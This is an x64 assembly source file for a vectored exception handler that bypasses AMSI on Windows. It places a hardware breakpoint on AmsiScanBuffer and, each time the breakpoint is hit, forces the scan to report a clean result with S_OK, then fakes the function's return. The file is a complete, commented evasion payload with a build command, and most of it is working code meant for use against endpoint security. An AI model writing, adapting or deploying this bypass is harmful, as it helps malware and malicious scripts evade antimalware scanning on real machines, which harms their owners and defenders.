[BITS 64]

; nasm -f bin veh.asm -o veh.bin ; xxd -i veh.bin

    ; rcx = PEXCEPTION_POINTERS
    mov r8, [rcx + 8]   ; r8 = ContextRecord
    mov r9, [rcx]       ; r9 = ExceptionRecord
    mov eax, [r9]       ; eax = ExceptionCode

    cmp eax, 0x80000003 ; EXCEPTION_BREAKPOINT (int 3)
    je handle_bp
    cmp eax, 0x80000004 ; EXCEPTION_SINGLE_STEP (HWBP hit)
    je handle_ss

    xor eax, eax        ; EXCEPTION_CONTINUE_SEARCH
    ret

    handle_bp:
        ; Setup the HWBP)
        lea r10, [rel amsi_addr]
        mov r10, [r10]
        mov [r8 + 0x48], r10        ; r8 + 0x48 = CONTEXT_RECORD.Dr0
        mov dword [r8 + 0x70], 1    ; r8 + 0x70 = CONTEXT_RECORD.Dr7 (Enable Dr0)
        ; Dr7 layout : https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context#debug-registers

        ; Apply the HWBP by setting context flags to CONTEXT_DEBUG_REGISTERS (0x10)
        or dword [r8 + 0x30], 0x10  ; r8 + 0x30 = CONTEXT_RECORD.ContextFlags

        ; Pass the int3 instruction 
        add qword [r8 + 0xf8], 1 

        mov eax, -1     ; EXCEPTION_CONTINUE_EXECUTION
        ret

    handle_ss:
        ; Check if Exception appears at the right offset (AmsiScanBuffer)
        mov r11, [r8 + 0xf8] ; r11 = Rip
        lea r10, [rel amsi_addr]
        mov r10, [r10]
        cmp r11, r10
        jne not_amsi

        ; --- BYPASS AMSI --- 
        mov r11, [r8 + 0x98]     ; r11 = CONTEXT_RECORD.Rsp (stack pointer at function entry)

        ; Retrieve the 6th argument (AMSI_RESULT pointer) from the stack
        ; [RSP] = ret addr, [RSP+0x8 to 0x20] = shadow space, [RSP+0x28] = 5th arg, [RSP+0x30] = 6th arg
        mov r12, [r11 + 0x30]    ; r12 = pointer to AMSI_RESULT

        ; Sanity check to avoid access violation if pointer is null
        test r12, r12
        jz skip_result

        ; Set AMSI_RESULT to AMSI_RESULT_NOT_DETECTED (1) to simulate a clean scan
        mov dword [r12], 1

skip_result:
        ; Set ret value of AmsiScanBuffer to S_OK (0) 
        mov dword [r8 + 0x68], 0 ; r8 + 0x68 = Rax of the context record (return value of AmsiScanBuffer)

        ; Emulate the "ret" of AmsiScanBuffer to avoid crashing the process (pop ret addr and set rip to it)
        mov r10, [r11]           ; r10 = ret addr of AmsiScanBuffer (on top of the stack)
        mov [r8 + 0xf8], r10     ; Rip = ret addr of AmsiScanBuffer
        add qword [r8 + 0x98], 8 ; Rsp += 8 (simulate pop stack)

        ; Instruct the OS to keep applying the debug registers (since we want to catch all future scans on this thread)
        or dword [r8 + 0x30], 0x10 ; ContextFlags |= CONTEXT_DEBUG_REGISTERS

        mov eax, -1     ; EXCEPTION_CONTINUE_EXECUTION
        ret

    not_amsi:
        xor eax, eax
        ret

    align 8
    amsi_addr:
    dq 0xAAAAAAAAAAAAAAAA